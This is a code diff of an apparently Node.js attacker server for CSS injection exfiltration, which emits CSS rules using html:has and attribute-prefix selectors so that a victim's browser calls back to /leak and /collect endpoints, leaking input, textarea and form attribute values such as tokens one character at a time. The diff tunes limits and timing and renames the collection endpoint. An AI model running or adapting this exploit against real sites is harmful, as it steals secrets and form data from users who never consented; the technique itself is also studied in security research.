@@ -5,13 +5,12 @@ const port = 5001;
 const HOSTNAME = "http://localhost:5001";
 const ELEMENTS = ["input","textarea","form"];
 const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"]};
-const MAX_ELEMENTS = 4;
+const MAX_ELEMENTS = 20;
 const MAX_VALUE = 50;
-const WAIT_TIME_MS = 250;
+const WAIT_TIME_MS = 500;
 
 const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126).split('');
 
-var pending = [];
 var stop = false, n = 0, prefixes = {__proto__:null};
 var tokens = [], foundToken = false, currentElementPos = 0;
 
@@ -25,8 +24,7 @@ const requestHandler = (request, response) => {
             n = 0;
             tokens = [];
             prefixes = {__proto__:null};
-            stop = false;        
-            pending = [];
+            stop = false;                    
             foundToken = false;
             currentElementPos = 0;
             genResponse(response, 0);
@@ -41,29 +39,29 @@ const requestHandler = (request, response) => {
                             if(typeof prefixes['p_'+element+attribute+elementNumber] === 'undefined') {
                                 prefixes['p_'+element+attribute+elementNumber] = '';
                             } 
-                            prefixes['p_'+element+attribute+elementNumber] = req.query['p_'+element+attribute+elementNumber];
-                            foundToken = true;
+                            if(req.query['p_'+element+attribute+elementNumber].length > prefixes['p_'+element+attribute+elementNumber].length) {
+                                prefixes['p_'+element+attribute+elementNumber] = req.query['p_'+element+attribute+elementNumber];                            
+                                foundToken = true;
+                            }
                         }
                     }                
                 }
             }
             //console.log('\tleak: waiting others...');   
         break;
-        case "/next":
-            pending.push(response);            
+        case "/next":                     
             //console.log('\tquery: waiting others...');
             setTimeout(x=>{            
                 if(!foundToken) {
-                    currentElementPos++;   
-                }
-                foundToken =false;
-                if(pending.length) {            
+                    checkCompleted(response);
+                } else {
+                    foundToken =false;                  
                     n++;
-                    genResponse(pending.shift(), currentElementPos);
-                }          
+                    genResponse(response, currentElementPos);                
+                }
             }, WAIT_TIME_MS);
         break;
-        case "/end":   
+        case "/collect":   
             response.end();
             let attribute = req.query.attribute;
             let tag = req.query.tag;
@@ -72,7 +70,7 @@ const requestHandler = (request, response) => {
             if(!hasToken({tag, attribute, tagNumber, value})) {
                 tokens.push({tag, attribute, tagNumber, value});
                 foundToken = true;
-            }           
+            }                  
         default:
             response.end();
     }
@@ -89,7 +87,7 @@ const genResponse = (response, elementNumber) => {
             }
             const prefix = prefixes['p_'+element+attribute+elementNumber];
             css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/leak?elementNumber='+(elementNumber)+'&t='+Date.now()+'&n='+n+'&p_'+element+attribute+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');                                            
-            css += 'html:has(['+attribute+'="'+ prefix + '"]'+generateNotSelectors(element,attribute)+')'+'{'+variablePrefix+'full-token:url(' + HOSTNAME + '/end?tag='+element+'&attribute='+attribute+'&tagNumber='+elementNumber+'&value=' + encodeURIComponent(prefix) + ');}';                            
+            css += 'html:has(['+attribute+'="'+ prefix + '"]'+generateNotSelectors(element,attribute)+')'+'{'+variablePrefix+'full-token:url(' + HOSTNAME + '/collect?tag='+element+'&attribute='+attribute+'&tagNumber='+elementNumber+'&value=' + encodeURIComponent(prefix) + ');}';                            
         }
     }
     if(n === 0 && elementNumber === 0) {  
@@ -133,7 +131,7 @@ function hasToken(newToken) {
 }
 
 function checkCompleted(response) {
-    if(currentElementPos < MAX_ELEMENTS) {
+    if(++currentElementPos < MAX_ELEMENTS) {
         prefixes = {__proto__:null};
         stop = false;
         n = 0;
